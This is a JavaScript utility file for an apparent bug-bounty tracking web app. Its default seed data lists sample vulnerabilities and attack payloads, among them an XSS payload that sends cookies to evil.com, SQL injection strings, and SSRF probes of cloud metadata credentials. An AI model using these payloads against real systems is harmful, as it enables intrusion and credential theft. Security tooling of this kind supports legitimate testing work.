/* ============================================
   TaxonoX — Core App Utilities
   app.js — uses TXStorage (dual mode)
   ============================================ */
'use strict';

/* ---- Alias Storage to TXStorage ---- */
const Storage = window.TXStorage;

/* ---- ID Generator ---- */
const genId = (prefix = 'VULN') => {
  const count = Storage.get('id_counter', 0) + 1;
  Storage.set('id_counter', count);
  return `${prefix}-${String(count).padStart(3, '0')}`;
};

/* ---- Default Data ---- */
const DEFAULT_VULNERABILITIES = [
  { id:'VULN-001', name:'SQL Injection', severity:'Critical', owasp:'A03:2021', cwe:'CWE-89', status:'Reported', date:'2024-05-22', tags:['SQLi','Auth','P1'], target:'api.example.com', platform:'HackerOne', shortDesc:'SQL injection via login parameter allows full DB dump.', howToFind:'Test POST /login with single quote in email field.', exploit:"' OR 1=1--", remediation:'Use parameterized queries and prepared statements.', starred:true, viewed:Date.now() },
  { id:'VULN-002', name:'XSS (Stored)', severity:'High', owasp:'A03:2021', cwe:'CWE-79', status:'In Progress', date:'2024-05-20', tags:['XSS','P2'], target:'app.target.io', platform:'Bugcrowd', shortDesc:'Stored XSS in user bio field reflected to all users.', howToFind:'Input <script>alert(1)</script> in profile bio.', exploit:'<img src=x onerror=fetch(`https://evil.com/c?c=${document.cookie})>', remediation:'Sanitize and encode all user-supplied HTML output.', starred:false, viewed:Date.now()-3600000 },
  { id:'VULN-003', name:'IDOR', severity:'High', owasp:'A01:2021', cwe:'CWE-639', status:'New', date:'2024-05-20', tags:['IDOR','API','P2'], target:'api.shop.com', platform:'HackerOne', shortDesc:'IDOR on /api/orders/{id} leaks other users orders.', howToFind:'Enumerate order IDs after authenticating as user A.', exploit:'GET /api/orders/1337 with any authenticated session.', remediation:'Verify ownership server-side for every object access.', starred:false, viewed:Date.now()-7200000 },
  { id:'VULN-004', name:'SSRF', severity:'Medium', owasp:'A10:2021', cwe:'CWE-918', status:'Confirmed', date:'2024-05-19', tags:['SSRF','Cloud','P3'], target:'internal.corp.io', platform:'Private', shortDesc:'SSRF via webhook URL parameter fetches internal metadata.', howToFind:'Set webhook URL to http://169.254.169.254/latest/meta-data/', exploit:'http://169.254.169.254/latest/meta-data/iam/security-credentials/', remediation:'Validate and allowlist webhook URLs. Block RFC1918.', starred:true, viewed:Date.now()-1800000 },
  { id:'VULN-005', name:'CSRF', severity:'Medium', owasp:'A01:2021', cwe:'CWE-352', status:'New', date:'2024-05-19', tags:['CSRF','P3'], target:'dashboard.saas.io', platform:'HackerOne', shortDesc:'Missing CSRF token on account deletion endpoint.', howToFind:'Submit DELETE /account without CSRF token.', exploit:'<form action="https://dashboard.saas.io/account" method="POST">', remediation:'Implement CSRF tokens and SameSite cookie attribute.', starred:false, viewed:Date.now()-5400000 },
  { id:'VULN-006', name:'Clickjacking', severity:'Low', owasp:'A05:2021', cwe:'CWE-1021', status:'Duplicate', date:'2024-05-18', tags:['P4'], target:'portal.example.com', platform:'Bugcrowd', shortDesc:'Missing X-Frame-Options allows page embedding.', howToFind:'Embed target in iframe — no CSP blocking observed.', exploit:'<iframe src="https://portal.example.com/settings">', remediation:'Add X-Frame-Options: DENY or CSP frame-ancestors.', starred:false, viewed:Date.now()-9000000 }
];
const DEFAULT_PAYLOADS = [
  { id:'PAY-001', name:'XSS Basic', category:'XSS', payload:'<script>alert(1)</script>', notes:'Basic alert test' },
  { id:'PAY-002', name:'XSS img onerror', category:'XSS', payload:'<img src=x onerror=alert(1)>', notes:'Works without script tag' },
  { id:'PAY-003', name:'SQLi Basic', category:'SQLi', payload:"' OR 1=1--", notes:'Classic login bypass' },
  { id:'PAY-004', name:'SQLi UNION', category:'SQLi', payload:"' UNION SELECT null,username,password FROM users--", notes:'Data extraction' },
  { id:'PAY-005', name:'SSRF localhost', category:'SSRF', payload:'http://127.0.0.1/', notes:'Basic localhost probe' },
  { id:'PAY-006', name:'SSRF AWS metadata', category:'SSRF', payload:'http://169.254.169.254/latest/meta-data/', notes:'Cloud instance metadata' },
  { id:'PAY-007', name:'Path Traversal', category:'LFI', payload:'../../../etc/passwd', notes:'Unix passwd file' },
  { id:'PAY-008', name:'SSTI Jinja2', category:'SSTI', payload:'{{7*7}}', notes:'Basic Jinja2 detection' }
];
const DEFAULT_NOTES = [
  { id:'NOTE-001', title:'Recon Checklist', content:'# Recon Checklist\n\n- [ ] Subdomain enum (subfinder, amass)\n- [ ] Port scan (nmap)\n- [ ] Tech stack fingerprint\n- [ ] JS files analysis\n- [ ] API endpoints discovery\n- [ ] Parameter fuzzing', tags:['Recon'], date:'2024-05-22', pinned:true },
  { id:'NOTE-002', title:'Bug Bounty Tips', content:'# Bug Bounty Tips\n\n- Always read the scope carefully\n- Focus on business logic flaws\n- Check mobile app APIs\n- Look for misconfigurations\n- Document everything with screenshots', tags:['Tips'], date:'2024-05-20', pinned:false }
];
const DEFAULT_WRITEUPS = [
  { id:'WU-001', title:'SQL Injection in Login — $5000 Bounty', target:'api.example.com', severity:'Critical', bounty:'$5,000', platform:'HackerOne', summary:'Found blind SQLi in login endpoint via timing attack.', exploitChain:'Input → SQLi → Full DB dump → Admin account takeover', lessons:'Always check error messages and timing differences.', date:'2024-05-10', tags:['SQLi','Auth'] }
];
const DEFAULT_TOOLS = [
  { id:'TOOL-001', name:'Burp Suite', category:'Proxy', description:'Web application security testing platform', commands:'burpsuite', tags:['Proxy','Essential'] },
  { id:'TOOL-002', name:'subfinder', category:'Recon', description:'Fast passive subdomain enumeration tool', commands:'subfinder -d target.com -o subs.txt', tags:['Recon','Subdomain'] },
  { id:'TOOL-003', name:'nuclei', category:'Scanner', description:'Fast vulnerability scanner using templates', commands:'nuclei -u https://target.com -t cves/', tags:['Scanner','CVE'] },
  { id:'TOOL-004', name:'ffuf', category:'Fuzzer', description:'Fast web fuzzer for directory and parameter discovery', commands:'ffuf -u https://target.com/FUZZ -w wordlist.txt', tags:['Fuzzer','Recon'] },
  { id:'TOOL-005', name:'sqlmap', category:'Exploit', description:'Automatic SQL injection tool', commands:'sqlmap -u "http://target.com/?id=1" --dbs', tags:['SQLi','Exploit'] }
];

/* ---- Init App Data (only if empty) ---- */
function initData() {
  if (!Storage.get('vulns'))     Storage.set('vulns', DEFAULT_VULNERABILITIES);
  if (!Storage.get('payloads'))  Storage.set('payloads', DEFAULT_PAYLOADS);
  if (!Storage.get('notes'))     Storage.set('notes', DEFAULT_NOTES);
  if (!Storage.get('tools'))     Storage.set('tools', DEFAULT_TOOLS);
  if (!Storage.get('writeups'))  Storage.set('writeups', DEFAULT_WRITEUPS);
  if (!Storage.get('id_counter'))Storage.set('id_counter', 6);
  if (!Storage.get('settings'))  Storage.set('settings', { username: Storage.getUsername(), role: 'Bug Hunter', theme: 'dark', accentColor: 'purple' });
}

/* ---- Toast Notifications ---- */
function showToast(type = 'success', title, message = '') {
  let container = document.getElementById('toast-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'toast-container';
    container.className = 'toast-container';
    document.body.appendChild(container);
  }
  const icons = { success:'✓', error:'✕', warning:'⚠', info:'ℹ' };
  const colors = { success:'#10b981', error:'#ef4444', warning:'#f59e0b', info:'#8b5cf6' };
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <div class="toast-icon" style="color:${colors[type]};font-size:16px;font-weight:700">${icons[type]}</div>
    <div class="toast-content">
      <div class="toast-title">${title}</div>
      ${message ? `<div class="toast-message">${message}</div>` : ''}
    </div>
    <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:14px;padding:0 0 0 8px;align-self:flex-start">✕</button>
  `;
  container.appendChild(toast);
  setTimeout(() => {
    toast.style.animation = 'toastOut 0.3s ease forwards';
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

/* ---- Sidebar Toggle ---- */
function initSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (!sidebar) return;
  const collapsed = Storage.get('sidebar_collapsed', false);
  if (collapsed) sidebar.classList.add('collapsed');

  document.querySelectorAll('.navbar-toggle, .sidebar-toggle-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      sidebar.classList.toggle('collapsed');
      Storage.set('sidebar_collapsed', sidebar.classList.contains('collapsed'));
    });
  });

  const overlay = document.getElementById('sidebar-overlay');
  if (overlay) {
    overlay.addEventListener('click', () => {
      sidebar.classList.remove('mobile-open');
      overlay.classList.remove('active');
    });
  }
  const mobileBtn = document.getElementById('mobile-menu-btn');
  if (mobileBtn) {
    mobileBtn.addEventListener('click', () => {
      sidebar.classList.toggle('mobile-open');
      overlay && overlay.classList.toggle('active');
    });
  }
}

/* ---- Global Search ---- */
function initSearch() {
  const input = document.getElementById('global-search');
  const results = document.getElementById('search-results');
  if (!input || !results) return;
  let debounce;
  input.addEventListener('input', () => {
    clearTimeout(debounce);
    debounce = setTimeout(() => {
      const q = input.value.trim().toLowerCase();
      if (!q) { results.style.display = 'none'; return; }
      const vulns = Storage.get('vulns', []);
      const hits = vulns.filter(v =>
        v.name.toLowerCase().includes(q) ||
        v.id.toLowerCase().includes(q) ||
        (v.tags||[]).some(t => t.toLowerCase().includes(q))
      ).slice(0, 8);
      results.innerHTML = hits.length
        ? hits.map(v => `<div class="search-result-item" onclick="window.location.href='vulnerability.html?id=${v.id}'"><span class="severity-dot ${v.severity.toLowerCase()}"></span><div><div class="search-result-name">${highlight(v.name,q)}</div><div class="search-result-meta">${v.id} · ${v.severity} · ${v.status}</div></div></div>`).join('')
        : '<div style="padding:12px 14px;color:var(--text-muted);font-size:12px">No results found</div>';
      results.style.display = 'block';
    }, 200);
  });
  document.addEventListener('click', e => {
    if (!input.contains(e.target) && !results.contains(e.target)) results.style.display = 'none';
  });
  document.addEventListener('keydown', e => {
    if ((e.ctrlKey||e.metaKey) && e.key==='k') { e.preventDefault(); input.focus(); input.select(); }
    if (e.key==='Escape') { results.style.display='none'; input.blur(); }
  });
}

function highlight(text, query) {
  const re = new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`, 'gi');
  return text.replace(re, '<span class="highlight">$1</span>');
}

/* ---- Active Nav ---- */
function setActiveNav() {
  const current = location.pathname.split('/').pop() || 'dashboard.html';
  document.querySelectorAll('.nav-item').forEach(el => {
    const href = el.getAttribute('href') || '';
    if (href === current || (current==='' && href==='dashboard.html')) el.classList.add('active');
    else el.classList.remove('active');
  });
}

/* ---- Dropdowns ---- */
function initDropdowns() {
  document.addEventListener('click', e => {
    const trigger = e.target.closest('[data-dropdown]');
    if (trigger) {
      const menu = document.getElementById(trigger.dataset.dropdown);
      if (menu) {
        const isOpen = menu.classList.contains('open');
        document.querySelectorAll('.dropdown-menu.open').forEach(m => m.classList.remove('open'));
        if (!isOpen) menu.classList.add('open');
      }
    } else if (!e.target.closest('.dropdown-menu')) {
      document.querySelectorAll('.dropdown-menu.open').forEach(m => m.classList.remove('open'));
    }
  });
}

/* ---- Modal System ---- */
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) { modal.style.display = 'flex'; document.body.style.overflow = 'hidden'; }
}
function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) { modal.style.display = 'none'; document.body.style.overflow = ''; }
}
function initModals() {
  document.querySelectorAll('[data-modal-open]').forEach(btn => btn.addEventListener('click', () => openModal(btn.dataset.modalOpen)));
  document.querySelectorAll('[data-modal-close]').forEach(btn => btn.addEventListener('click', () => closeModal(btn.dataset.modalClose)));
  document.querySelectorAll('.modal-backdrop').forEach(modal => {
    modal.addEventListener('click', e => { if (e.target===modal) closeModal(modal.id); });
  });
  document.addEventListener('keydown', e => {
    if (e.key==='Escape') document.querySelectorAll('.modal-backdrop').forEach(m => { if (m.style.display!=='none') closeModal(m.id); });
  });
}

/* ---- Tabs ---- */
function initTabs(sel='.tabs') {
  document.querySelectorAll(sel).forEach(tabBar => {
    tabBar.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const target = btn.dataset.tab;
        const parent = tabBar.closest('.tab-container') || tabBar.parentElement;
        tabBar.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        parent.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
        const panel = parent.querySelector(`[data-tab-panel="${target}"]`);
        if (panel) panel.classList.add('active');
      });
    });
  });
}

/* ---- User Display ---- */
function initUserDisplay() {
  const settings = Storage.get('settings', { username: Storage.getUsername(), role: 'Bug Hunter' });
  const username = settings.username || Storage.getUsername() || 'Hunter';
  const role = settings.role || 'Bug Hunter';
  document.querySelectorAll('.user-name-display').forEach(el => el.textContent = username);
  document.querySelectorAll('.user-role-display').forEach(el => el.textContent = role);
  document.querySelectorAll('.user-avatar-display').forEach(el => el.textContent = username[0].toUpperCase());

  // Show logout button if logged in
  if (Storage.isLoggedIn()) {
    document.querySelectorAll('.logout-btn').forEach(btn => { btn.style.display = 'flex'; });
  }
}

/* ---- Counter Animation ---- */
function animateCounter(el, target, duration = 800) {
  let startTime;
  const step = timestamp => {
    if (!startTime) startTime = timestamp;
    const progress = Math.min((timestamp - startTime) / duration, 1);
    const eased = 1 - Math.pow(1-progress, 3);
    el.textContent = Math.round(target * eased);
    if (progress < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}
function animateCounters() {
  document.querySelectorAll('[data-count]').forEach(el => {
    const t = parseInt(el.dataset.count, 10);
    if (!isNaN(t)) { animateCounter(el, t); el.removeAttribute('data-count'); }
  });
}
function animateProgressBars() {
  document.querySelectorAll('.progress-fill[data-width]').forEach(el => {
    const w = el.dataset.width;
    setTimeout(() => { el.style.width = w + '%'; }, 100);
  });
}

/* ---- Export / Import ---- */
function exportData() {
  const data = {
    version: '1.0', exported: new Date().toISOString(),
    vulnerabilities: Storage.get('vulns',[]),
    payloads: Storage.get('payloads',[]),
    notes: Storage.get('notes',[]),
    tools: Storage.get('tools',[]),
    writeups: Storage.get('writeups',[])
  };
  const blob = new Blob([JSON.stringify(data,null,2)], { type:'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `taxonox-backup-${new Date().toISOString().slice(0,10)}.json`;
  a.click();
  URL.revokeObjectURL(url);
  showToast('success','Export Complete','Data exported successfully');
}
function importData(file) {
  const reader = new FileReader();
  reader.onload = e => {
    try {
      const data = JSON.parse(e.target.result);
      if (data.vulnerabilities) Storage.set('vulns', data.vulnerabilities);
      if (data.payloads)        Storage.set('payloads', data.payloads);
      if (data.notes)           Storage.set('notes', data.notes);
      if (data.tools)           Storage.set('tools', data.tools);
      if (data.writeups)        Storage.set('writeups', data.writeups);
      showToast('success','Import Complete','Data imported successfully');
      setTimeout(() => location.reload(), 1000);
    } catch { showToast('error','Import Failed','Invalid JSON file'); }
  };
  reader.readAsText(file);
}

/* ---- Particles ---- */
function initParticles() {
  const container = document.querySelector('.particles');
  if (!container) return;
  for (let i = 0; i < 15; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.cssText = `left:${Math.random()*100}%;animation-duration:${8+Math.random()*12}s;animation-delay:${-Math.random()*10}s;width:${1+Math.random()*2}px;height:${1+Math.random()*2}px;opacity:${0.2+Math.random()*0.4};`;
    container.appendChild(p);
  }
}

/* ---- Format Helpers ---- */
function formatDate(s) {
  if (!s) return '—';
  return new Date(s).toLocaleDateString('en-US', { month:'short', day:'numeric', year:'numeric' });
}
function timeAgo(ts) {
  const diff = Date.now() - ts;
  const m = Math.floor(diff/60000);
  if (m<1) return 'just now';
  if (m<60) return `${m}m ago`;
  const h = Math.floor(m/60);
  if (h<24) return `${h}h ago`;
  return `${Math.floor(h/24)}d ago`;
}
function severityColor(s) {
  return ({ critical:'#ff2d55', high:'#ff6b35', medium:'#fbbf24', low:'#06b6d4', info:'#8b5cf6' })[(s||'').toLowerCase()] || '#94a3b8';
}
function severityClass(s) { return (s||'').toLowerCase(); }

/* ---- Stats ---- */
function getVulnStats() {
  const vulns = Storage.get('vulns',[]);
  return {
    total: vulns.length,
    critical: vulns.filter(v=>v.severity==='Critical').length,
    high:     vulns.filter(v=>v.severity==='High').length,
    medium:   vulns.filter(v=>v.severity==='Medium').length,
    low:      vulns.filter(v=>v.severity==='Low').length,
    info:     vulns.filter(v=>v.severity==='Info').length,
    writeups: Storage.get('writeups',[]).length
  };
}

/* ---- Keyboard Shortcuts ---- */
function initKeyboardShortcuts() {
  const shortcuts = {
    'n': () => { const b=document.getElementById('add-vuln-btn'); if(b) b.click(); },
    '/': () => { const s=document.getElementById('global-search'); if(s){s.focus();s.select();} },
    '1': () => location.href='dashboard.html',
    '2': () => location.href='vulnerabilities.html',
    '3': () => location.href='taxonomy.html',
    '4': () => location.href='writeups.html',
    '5': () => location.href='payloads.html',
    '?': () => openModal('shortcuts-modal')
  };
  document.addEventListener('keydown', e => {
    if (e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'||e.target.tagName==='SELECT') return;
    const h = shortcuts[e.key];
    if (h) { e.preventDefault(); h(); }
  });
}

/* ---- Logout ---- */
function logout() {
  if (window.auth) {
    window.auth.signOut().catch(()=>{});
  }
  localStorage.setItem('txnx_mode', '');
  localStorage.removeItem('txnx_uid');
  localStorage.removeItem('txnx_username');
  window.location.replace('index.html');
}

/* ---- Init App ---- */
function initApp() {
  initData();
  initSidebar();
  initSearch();
  setActiveNav();
  initDropdowns();
  initModals();
  initTabs();
  initUserDisplay();
  initParticles();
  initKeyboardShortcuts();
  animateCounters();
  animateProgressBars();

  // Logout buttons
  document.querySelectorAll('.logout-btn').forEach(btn => btn.addEventListener('click', logout));

  // Import file input
  const importInput = document.getElementById('import-file');
  if (importInput) importInput.addEventListener('change', e => { if(e.target.files[0]) importData(e.target.files[0]); });
}

document.addEventListener('DOMContentLoaded', () => {
  // If logged in, sync from Firestore first, then init
  if (typeof TXStorage !== 'undefined' && TXStorage.isLoggedIn()) {
    TXStorage.syncFromFirestore(() => initApp());
  } else {
    initApp();
  }
});

/* ---- Global Exports ---- */
window.TaxonoX = {
  Storage, genId, showToast, openModal, closeModal,
  formatDate, timeAgo, severityColor, severityClass,
  getVulnStats, exportData, importData, animateCounter, logout
};
